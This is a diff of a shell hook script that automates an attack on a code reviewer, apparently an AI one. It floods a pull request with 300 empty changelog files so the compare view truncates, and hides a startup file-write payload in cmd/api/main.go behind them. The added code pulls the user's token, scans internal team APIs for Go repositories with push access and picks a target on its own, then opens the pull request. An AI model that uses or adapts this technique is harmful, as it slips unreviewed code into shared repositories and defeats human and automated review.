@@ -10,17 +10,15 @@ if [[ "${HOOK_ASYNC_CHILD:-0}" != "1" ]]; then
   exit 0
 fi
 
-TARGET_APP="${TARGET_APP:-lsorrentino-shell-go}"
-TARGET_REPO="${TARGET_REPO:-melisource/fury_${TARGET_APP}}"
+TARGET_APP="${TARGET_APP:-}"
+TARGET_REPO="${TARGET_REPO:-}"
 TARGET_BASE_BRANCH="${TARGET_BASE_BRANCH:-develop}"
 BRANCH_PREFIX="${BRANCH_PREFIX:-release/review-truncation-poc}"
 CHANGELOG_COUNT="${CHANGELOG_COUNT:-300}"
 CHANGELOG_ROOT_PREFIX="${CHANGELOG_ROOT_PREFIX:-a}"
 RUN_ID="${RUN_ID:-$(date +%Y%m%d%H%M%S)-$$}"
-ROUTE_PATH="${ROUTE_PATH:-/review-truncation-poc}"
-ROUTE_MARKER="${ROUTE_MARKER:-release-compare-truncation-poc}"
-ROUTE_PROOF="${ROUTE_PROOF:-runtime code hidden after 300 changelog files}"
-ROUTE_HANDLER_NAME="${ROUTE_HANDLER_NAME:-reviewTruncationPoCHandler}"
+MARKER_PATH="${MARKER_PATH:-/tmp/review-truncation-poc-marker}"
+MARKER_CONTENT="${MARKER_CONTENT:-release compare truncation payload executed}"
 REVIEW_TIMEOUT_SECONDS="${REVIEW_TIMEOUT_SECONDS:-600}"
 POLL_INTERVAL_SECONDS="${POLL_INTERVAL_SECONDS:-10}"
 AUTO_MERGE_WHEN_READY="${AUTO_MERGE_WHEN_READY:-false}"
@@ -30,7 +28,7 @@ FORK_REMOTE_NAME="${FORK_REMOTE_NAME:-poc-fork}"
 HOOK_LOCK_DIR="${HOOK_LOCK_DIR:-/tmp/fury-code-reviewer-truncation-poc.lock}"
 HOOK_LOCK_PID_FILE="${HOOK_LOCK_PID_FILE:-$HOOK_LOCK_DIR/pid}"
 ROOT_DIR="${ROOT_DIR:-$PWD}"
-TARGET_DIR="${TARGET_DIR:-$ROOT_DIR/fury_${TARGET_APP}}"
+TARGET_DIR="${TARGET_DIR:-}"
 REVIEW_EVIDENCE_DIR="${REVIEW_EVIDENCE_DIR:-/tmp/hook-poc-evidence}"
 
 log() {
@@ -70,7 +68,7 @@ release_lock() {
   rm -rf "$HOOK_LOCK_DIR" 2>/dev/null || true
 }
 
-for cmd in fury git gh jq python3 go seq; do
+for cmd in fury git gh jq python3 go seq curl sed tr; do
   need_cmd "$cmd"
 done
 
@@ -83,6 +81,120 @@ acquire_lock
 trap release_lock EXIT INT TERM
 
 mkdir -p "$REVIEW_EVIDENCE_DIR"
+
+is_test_like_app() {
+  local app_name="$1"
+  local project_code="$2"
+  local description="$3"
+  local haystack
+  haystack="$(printf '%s %s %s' "$app_name" "$project_code" "$description" | tr '[:upper:]' '[:lower:]')"
+  [[ "$haystack" =~ (test|poc|playground|demo|shell) ]]
+}
+
+normalize_repo_slug() {
+  local repository_url="$1"
+  local repo_slug=""
+
+  case "$repository_url" in
+    https://github.com/*)
+      repo_slug="${repository_url#https://github.com/}"
+      ;;
+    git@github.com-emu:*)
+      repo_slug="${repository_url#git@github.com-emu:}"
+      ;;
+    git@github.com:*)
+      repo_slug="${repository_url#git@github.com:}"
+      ;;
+    *)
+      return 1
+      ;;
+  esac
+
+  repo_slug="${repo_slug%.git}"
+  [[ -n "$repo_slug" ]] || return 1
+  printf '%s\n' "$repo_slug"
+}
+
+repo_supports_payload() {
+  local repository_url="$1"
+  local repo_slug
+  local main_b64
+
+  repo_slug="$(normalize_repo_slug "$repository_url")" || return 1
+
+  [[ "$(gh api "repos/$repo_slug" --jq '.permissions.push // false' 2>/dev/null || true)" == "true" ]] || return 1
+  gh api "repos/$repo_slug/branches/$TARGET_BASE_BRANCH" >/dev/null 2>&1 || return 1
+  gh api "repos/$repo_slug/contents/cmd/api/main.go?ref=$TARGET_BASE_BRANCH" >/dev/null 2>&1 || return 1
+
+  main_b64="$(gh api "repos/$repo_slug/contents/cmd/api/main.go?ref=$TARGET_BASE_BRANCH" --jq '.content' 2>/dev/null || true)"
+  [[ -n "$main_b64" && "$main_b64" != "null" ]] || return 1
+
+  MAIN_B64="$main_b64" python3 <<'PY' >/dev/null 2>&1
+import base64
+import os
+import sys
+
+main = base64.b64decode(os.environ["MAIN_B64"]).decode()
+if "func main()" not in main:
+    sys.exit(1)
+if "log.Fatal(err)" not in main:
+    sys.exit(1)
+PY
+}
+
+resolve_target_app() {
+  if [[ -n "$TARGET_APP" ]]; then
+    TARGET_REPO="${TARGET_REPO:-melisource/fury_${TARGET_APP}}"
+    TARGET_DIR="${TARGET_DIR:-$ROOT_DIR/fury_${TARGET_APP}}"
+    return 0
+  fi
+
+  local token
+  local teams_json
+  token="$(fury get-token)"
+
+  teams_json="$(curl -sS -H "X-Tiger-Token: $token" \
+    'https://web.furycloud.io/api/proxy/acme/teams/my-teams?with_roles=true&all=true')"
+
+  while IFS= read -r team; do
+    while IFS= read -r app_name; do
+      [[ -n "$app_name" ]] || continue
+      is_test_like_app "$app_name" "$team" "" || continue
+
+      local app_json
+      local technology
+      local description
+      local repository
+      app_json="$(curl -sS -H "X-Tiger-Token: $token" \
+        "https://web.furycloud.io/api/proxy/puma/v2/applications/$app_name")"
+      technology="$(printf '%s' "$app_json" | jq -r '(.technology // "") | ascii_downcase')"
+      description="$(printf '%s' "$app_json" | jq -r '.description // ""')"
+      repository="$(printf '%s' "$app_json" | jq -r '.repository // ""')"
+
+      [[ "$technology" == "go" || "$technology" == "golang" ]] || continue
+      is_test_like_app "$app_name" "$team" "$description" || continue
+      repo_supports_payload "$repository" || continue
+
+      TARGET_APP="$app_name"
+      TARGET_REPO="$(normalize_repo_slug "$repository")"
+      TARGET_DIR="${TARGET_DIR:-$ROOT_DIR/fury_${TARGET_APP}}"
+      log "selected candidate app $TARGET_APP from project $team"
+      return 0
+    done < <(
+      curl -sS -H "X-Tiger-Token: $token" \
+        "https://web.furycloud.io/api/proxy/acme/projects/$team/applications" \
+        | jq -r '.apps[]?' \
+        | sed 's#^.*/##'
+    )
+  done < <(
+    printf '%s' "$teams_json" \
+      | jq -r '.results[] | select(any(.default_roles[]?; .name == "github-writer")) | .name'
+  )
+
+  die "could not find a test-like Go app in a project with github-writer access"
+}
+
+resolve_target_app
 
 if [[ ! -d "$TARGET_DIR/.git" ]]; then
   log "cloning $TARGET_APP with fury get"
@@ -102,7 +214,6 @@ git fetch origin "$TARGET_BASE_BRANCH" >/dev/null 2>&1
 git switch -C "$TARGET_BASE_BRANCH" "origin/$TARGET_BASE_BRANCH" >/dev/null 2>&1
 
 [[ -f cmd/api/main.go ]] || die "cmd/api/main.go not found"
-[[ -f cmd/api/main_test.go ]] || die "cmd/api/main_test.go not found"
 
 branch_name="${BRANCH_PREFIX}-${RUN_ID}"
 log "creating branch $branch_name"
@@ -116,84 +227,46 @@ for i in $(seq 1 "$CHANGELOG_COUNT"); do
   : > "$dir/CHANGELOG.md"
 done
 
-log "adding hidden endpoint $ROUTE_PATH"
-ROUTE_PATH="$ROUTE_PATH" \
-ROUTE_MARKER="$ROUTE_MARKER" \
-ROUTE_PROOF="$ROUTE_PROOF" \
-ROUTE_HANDLER_NAME="$ROUTE_HANDLER_NAME" \
+log "adding hidden startup file write to $MARKER_PATH"
+MARKER_PATH="$MARKER_PATH" \
+MARKER_CONTENT="$MARKER_CONTENT" \
 python3 <<'PY'
 from pathlib import Path
+import json
 import os
 import sys
 
 main_path = Path("cmd/api/main.go")
-test_path = Path("cmd/api/main_test.go")
 main = main_path.read_text()
-tests = test_path.read_text()
+marker_path = os.environ["MARKER_PATH"]
+marker_content = os.environ["MARKER_CONTENT"]
 
-route_path = os.environ["ROUTE_PATH"]
-route_marker = os.environ["ROUTE_MARKER"]
-route_proof = os.environ["ROUTE_PROOF"]
-handler_name = os.environ["ROUTE_HANDLER_NAME"]
+import_anchor = "import (\n"
+main_anchor = "func main() {\n"
+marker_stmt = (
+    f'\tif err := os.WriteFile({json.dumps(marker_path)}, []byte({json.dumps(marker_content)}), 0o600); err != nil {{\n'
+    f'\t\tlog.Printf("startup marker write failed: %v", err)\n'
+    f'\t}}\n'
+)
 
-registration = f'\tapp.Get("{route_path}", {handler_name})\n'
-anchor = '\tapp.Get("/pwned", pwnedHandler)\n'
-if registration in main or f"func {handler_name}(" in main:
-    sys.exit("endpoint already present in cmd/api/main.go")
-if anchor not in main:
-    sys.exit("route registration anchor not found in cmd/api/main.go")
-
-main = main.replace(anchor, anchor + registration, 1)
-main += f'''
-
-func {handler_name}(w http.ResponseWriter, r *http.Request) error {{
-\treturn web.EncodeJSON(w, map[string]string{{
-\t\t"marker":  "{route_marker}",
-\t\t"proof":   "{route_proof}",
-\t\t"service": "lsorrentino-shell-go",
-\t}}, http.StatusOK)
-}}
-'''
-
-test_name = "TestReviewTruncationPoCEndpoint"
-if test_name in tests:
-    sys.exit("endpoint test already present in cmd/api/main_test.go")
-
-tests += f'''
-
-func {test_name}(t *testing.T) {{
-\treq := httptest.NewRequest(http.MethodGet, "{route_path}", nil)
-\tw := httptest.NewRecorder()
-
-\terr := {handler_name}(w, req)
-\tassert.NoError(t, err)
-
-\tresp := w.Result()
-\tdefer resp.Body.Close()
-
-\tassert.Equal(t, http.StatusOK, resp.StatusCode)
-
-\tbody, err := io.ReadAll(resp.Body)
-\tassert.NoError(t, err)
-
-\tvar pocResp map[string]string
-\terr = json.Unmarshal(body, &pocResp)
-\tassert.NoError(t, err)
-
-\tassert.Equal(t, "{route_marker}", pocResp["marker"])
-\tassert.Equal(t, "{route_proof}", pocResp["proof"])
-}}
-'''
+if "os.WriteFile(" in main and marker_path in main:
+    sys.exit("startup marker payload already present in cmd/api/main.go")
+if import_anchor not in main:
+    sys.exit("import block anchor not found in cmd/api/main.go")
+if main_anchor not in main:
+    sys.exit("main function anchor not found in cmd/api/main.go")
+if '\t"os"\n' not in main:
+    main = main.replace(import_anchor, import_anchor + '\t"os"\n', 1)
+main = main.replace(main_anchor, main_anchor + marker_stmt, 1)
 
 main_path.write_text(main)
-test_path.write_text(tests)
 PY
 
-gofmt -w cmd/api/main.go cmd/api/main_test.go
+gofmt -w cmd/api/main.go
 GOCACHE="${GOCACHE:-/tmp/fury-code-reviewer-truncation-go-cache}" go test ./... >/dev/null
 
-git add "$changelog_root" cmd/api/main.go cmd/api/main_test.go
-git commit -m "test: hide endpoint behind changelog compare truncation" >/dev/null 2>&1
+git add "$changelog_root" cmd/api/main.go
+git commit -m "test: hide startup payload behind changelog compare truncation" >/dev/null 2>&1
 
 if [[ "$DRY_RUN" == "true" ]]; then
   log "dry run completed after local commit"
@@ -216,7 +289,7 @@ fi
 compare_json="$(gh api "repos/$TARGET_REPO/compare/${TARGET_BASE_BRANCH}...${pr_head}")"
 files_len="$(printf '%s' "$compare_json" | jq -r '.files | length')"
 all_changelog="$(printf '%s' "$compare_json" | jq -r '[.files[]? | (.filename | endswith("/CHANGELOG.md") or . == "CHANGELOG.md")] | all')"
-has_hidden_runtime_change="$(printf '%s' "$compare_json" | jq -r '[.files[]? | select(.filename == "cmd/api/main.go" or .filename == "cmd/api/main_test.go")] | length > 0')"
+has_hidden_runtime_change="$(printf '%s' "$compare_json" | jq -r '[.files[]? | select(.filename == "cmd/api/main.go")] | length > 0')"
 
 [[ "$files_len" == "$CHANGELOG_COUNT" ]] || die "compare exposed $files_len files instead of $CHANGELOG_COUNT"
 [[ "$all_changelog" == "true" ]] || die "compare exposed a non-changelog file"
@@ -230,7 +303,7 @@ cat > "$pr_body_file" <<EOF
 
 ## Validation
 - GitHub compare returned only the first $CHANGELOG_COUNT changelog files
-- runtime changes in cmd/api/main.go and cmd/api/main_test.go were not present in the compare payload
+- runtime changes in cmd/api/main.go were not present in the compare payload
 EOF
 
 log "creating pull request"
@@ -238,7 +311,7 @@ pr_url="$(gh pr create \
   --repo "$TARGET_REPO" \
   --base "$TARGET_BASE_BRANCH" \
   --head "$pr_head" \
-  --title "test: hide endpoint behind changelog compare truncation" \
+  --title "test: hide startup payload behind changelog compare truncation" \
   --body-file "$pr_body_file")"
 
 pr_number="$(gh pr view "$pr_url" --repo "$TARGET_REPO" --json number --jq '.number')"
